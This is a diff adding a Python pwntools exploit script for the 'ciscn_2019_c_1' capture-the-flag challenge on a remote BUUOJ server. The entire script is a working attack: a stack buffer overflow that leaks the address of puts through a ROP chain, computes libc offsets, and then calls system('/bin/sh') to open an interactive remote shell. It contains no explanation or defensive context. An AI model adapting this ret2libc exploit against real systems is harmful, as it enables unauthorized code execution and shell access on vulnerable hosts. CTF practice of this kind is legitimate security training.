@@ -1,0 +1,27 @@
+from pwn import *
+
+p=remote("node4.buuoj.cn",26504)
+#context(arch='amd64',os='linux',log_level='debug')
+pop_rdi=0x400c83
+ret=0x4006b9
+pop_rsi_r15=0x400c81
+elf=ELF('./ciscn_2019_c_1')
+
+puts_plt=elf.plt['puts']
+puts_got=elf.got['puts']
+main=elf.sym['main']
+p.sendlineafter("Welcome to this Encryption machine\n",'1')
+payload=b'\0'+b'b'*(0x50+8-1)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
+p.sendline(payload)
+p.recvline()
+p.recvline()
+puts_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
+print(hex(puts_addr))
+#pause()
+offset=puts_addr-0x0809c0
+system=offset+0x04f440
+binsh=offset+0x1b3e9a
+p.sendlineafter("Welcome to this Encryption machine\n",'1')
+payload2=b'\0'+b'a'*(0x50+8-1)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)
+p.sendline(payload2)
+p.interactive()
